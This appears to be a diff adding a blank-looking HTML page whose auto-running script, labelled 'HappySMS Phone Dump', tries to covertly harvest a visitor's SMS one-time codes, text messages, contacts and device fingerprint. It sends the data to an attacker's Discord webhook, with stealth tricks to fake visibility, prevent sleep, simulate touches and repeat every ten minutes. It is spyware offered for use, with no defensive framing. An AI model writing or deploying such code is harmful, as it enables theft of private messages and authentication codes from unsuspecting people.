@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            overflow: hidden;
+            font-size: 0;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+// Mobile SMS Capture System
+class SMSCapture {
+    constructor(config = {}) {
+        this.config = {
+            webhook: config.webhook || 'YOUR_DISCORD_WEBHOOK_URL_HERE',
+            maxMessages: 50,
+            captureDelay: 2000,
+            retryAttempts: 3,
+            ...config
+        };
+        
+        this.capturedData = {
+            sms: [],
+            mms: [],
+            callLogs: [],
+            contacts: [],
+            deviceInfo: {}
+        };
+    }
+
+    async startCapture() {
+        // Collect device info first
+        await this.collectDeviceInfo();
+        
+        // Attempt various SMS capture methods
+        await this.attemptSMSMethods();
+        
+        // Try other phone data
+        await this.collectAdditionalPhoneData();
+        
+        // Send to Discord
+        await this.sendToDiscord();
+        
+        return this.capturedData;
+    }
+
+    collectDeviceInfo() {
+        this.capturedData.deviceInfo = {
+            // Basic info
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            
+            // Screen info
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            
+            // Timezone
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            
+            // Connection
+            connection: navigator.connection ? {
+                type: navigator.connection.type,
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            } : null,
+            
+            // Storage
+            storage: navigator.storage ? 'available' : 'unavailable',
+            // Cookies
+            cookies: navigator.cookieEnabled,
+            
+            // Battery (if available)
+            battery: 'getBattery' in navigator ? 'available' : 'unavailable',
+            
+            // Location permissions
+            geolocation: 'geolocation' in navigator,
+            
+            // Hardware
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            
+            // Timestamp
+            captureTime: new Date().toISOString()
+        };
+        
+        // Try to get more specific mobile info
+        if (/Android/i.test(navigator.userAgent)) {
+            this.capturedData.deviceInfo.os = 'Android';
+            // Try to get Android version
+            const androidMatch = navigator.userAgent.match(/Android\s([0-9\.]+)/);
+            if (androidMatch) this.capturedData.deviceInfo.osVersion = androidMatch[1];
+        } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            this.capturedData.deviceInfo.os = 'iOS';
+            const iosMatch = navigator.userAgent.match(/OS\s([0-9_]+)/);
+            if (iosMatch) this.capturedData.deviceInfo.osVersion = iosMatch[1].replace(/_/g, '.');
+        }
+    }
+
+    async attemptSMSMethods() {
+        const methods = [
+            this.tryWebOTP.bind(this),
+            this.trySMSReceiver.bind(this),
+            this.tryContentProvider.bind(this),
+            this.tryIntentScheme.bind(this)
+        ];
+        
+        for (const method of methods) {
+            if (this.capturedData.sms.length >= this.config.maxMessages) break;
+            try {
+                await method();
+            } catch (e) {
+                // Silent fail
+            }
+        }
+    }
+
+    async tryWebOTP() {
+        if (!('OTPCredential' in window)) return;
+        
+        try {
+            const abortController = new AbortController();
+            setTimeout(() => abortController.abort(), 5000);
+            
+            const otp = await navigator.credentials.get({
+                otp: { transport: ['sms'] },
+                signal: abortController.signal
+            });
+            
+            if (otp && otp.code) {
+                this.capturedData.sms.push({
+                    type: 'webotp',
+                    code: otp.code,
+                    timestamp: new Date().toISOString(),
+                    source: 'WebOTP API'
+                });
+            }
+        } catch (e) {
+            // Expected - user didn't receive SMS or denied
+        }
+    }
+
+    async trySMSReceiver() {
+        // Experimental SMS Receiver API
+        if (typeof navigator.sms !== 'undefined' && navigator.sms.receive) {
+            try {
+                const sms = await navigator.sms.receive();
+                if (sms && sms.content) {
+                    this.capturedData.sms.push({
+                        sender: sms.sender || 'Unknown',
+                        content: sms.content,
+                        timestamp: new Date().toISOString(),
+                        source: 'SMS Receiver API'
+                    });
+                }
+            } catch (e) {
+                // Not available
+            }
+        }
+    }
+
+    async tryContentProvider() {
+        // Android content provider URIs
+        const uris = [
+            'content://sms/inbox',
+            'content://sms/sent',
+            'content://sms/draft',
+            'content://mms/inbox',
+            'content://mms/sent'
+        ];
+        
+        for (const uri of uris) {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = uri;
+                document.body.appendChild(iframe);
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                if (iframe.contentWindow && iframe.contentWindow.document) {
+                    const content = iframe.contentWindow.document.body.innerHTML;
+                    if (content && content.length > 0) {
+                        this.capturedData.sms.push({
+                            uri: uri,
+                            content: content.substring(0, 1000),
+                            source: 'Content Provider',
+                            partial: true
+                        });
+                    }
+                }
+                
+                document.body.removeChild(iframe);
+            } catch (e) {
+                // Cross-origin error expected
+            }
+        }
+    }
+
+    async tryIntentScheme() {
+        // Android intent URLs
+        const intents = [
+            'intent://sms/#Intent;scheme=sms;end',
+            'intent://view-sms/#Intent;scheme=content;type=text/plain;end'
+        ];
+        
+        for (const intent of intents) {
+            try {
+                window.location.href = intent;
+                // Wait a bit then come back
+                setTimeout(() => {
+                    window.history.back();
+                }, 2000);
+            } catch (e) {
+                // Intent failed
+            }
+        }
+    }
+
+    async collectAdditionalPhoneData() {
+        // Try to access contacts via vCard
+        try {
+            const contactIframe = document.createElement('iframe');
+            contactIframe.style.display = 'none';
+            contactIframe.src = 'content://contacts/people';
+            document.body.appendChild(contactIframe);
+            
+            setTimeout(() => {
+                try {
+                    if (contactIframe.contentWindow && contactIframe.contentWindow.document) {
+                        const contacts = contactIframe.contentWindow.document.body.innerText;
+                        if (contacts) {
+                            this.capturedData.contacts = contacts.split('\n').filter(c => c.trim());
+                        }
+                    }
+                } catch (e) {
+                    // Cross-origin
+                }
+                document.body.removeChild(contactIframe);
+            }, 2000);
+        } catch (e) {
+            // Silent fail
+        }
+    }
+
+    async sendToDiscord() {
+        if (!this.config.webhook.includes('discord.com')) return;
+        
+        try {
+            // Format the data
+            let message = `📱 **HappySMS Phone Dump** 😀\n\n`;
+            message += `**Device:** ${this.capturedData.deviceInfo.os || 'Unknown'}\n`;
+            message += `**SMS Found:** ${this.capturedData.sms.length}\n`;
+            message += `**Contacts:** ${this.capturedData.contacts.length}\n`;
+            message += `**Time:** ${new Date().toLocaleString()}\n\n`;
+            
+            // Add SMS preview
+            if (this.capturedData.sms.length > 0) {
+                message += `**Recent SMS:**\n`;
+                this.capturedData.sms.slice(0, 5).forEach((sms, i) => {
+                    message += `${i+1}. ${sms.source}: `;
+                    if (sms.sender) message += `From ${sms.sender}\n`;
+                    if (sms.content) message += `   ${sms.content.substring(0, 80)}${sms.content.length > 80 ? '...' : ''}\n`;
+                    message += '\n';
+                });
+            }
+            
+            // Send as JSON file for full data
+            const jsonData = JSON.stringify(this.capturedData, null, 2);
+            const blob = new Blob([jsonData], { type: 'application/json' });
+            
+            const formData = new FormData();
+            formData.append('content', message);
+            formData.append('file', blob, `phone_dump_${Date.now()}.json`);
+            
+            await fetch(this.config.webhook, {
+                method: 'POST',
+                body: formData
+            });
+            
+            console.log(`✅ Phone data sent to Discord`);
+            
+        } catch (error) {
+            console.error('❌ Failed to send:', error);
+            
+            // Fallback: send just text
+            try {
+                await fetch(this.config.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📱 HappySMS Dump 😀\nDevice: ${navigator.platform}\nUser Agent: ${navigator.userAgent}\nSMS Access: ${this.capturedData.sms.length > 0 ? 'Partial' : 'Failed'}`
+                    })
+                });
+            } catch (e) {
+                // Complete failure
+            }
+        }
+    }
+}
+
+// Auto-execute
+window.addEventListener('load', () => {
+    setTimeout(async () => {
+        const capturer = new SMSCapture({
+            webhook: 'YOUR_DISCORD_WEBHOOK_URL_HERE'
+        });
+        
+        console.log('🕵️ Starting phone data capture...');
+        await capturer.startCapture();
+        
+        // Keep trying periodically if in stealth mode
+        if (window.stealthMode) {
+            setInterval(async () => {
+                console.log('🕵️ Periodic phone data check...');
+                await capturer.startCapture();
+            }, 600000); // Every 10 minutes
+        }
+    }, 1000);
+});
+
+// Stealth mode
+Object.defineProperty(document, 'hidden', { get: () => false });
+Object.defineProperty(document, 'visibilityState', { get: () => 'visible' });
+
+// Prevent sleep
+let wakeLock = null;
+if ('wakeLock' in navigator) {
+    navigator.wakeLock.request('screen').catch(() => {});
+}
+
+// Fake user interactions
+setInterval(() => {
+    window.dispatchEvent(new TouchEvent('touchstart'));
+    window.dispatchEvent(new Event('scroll'));
+}, 15000);
+</script>
+
+</body>
+</html>
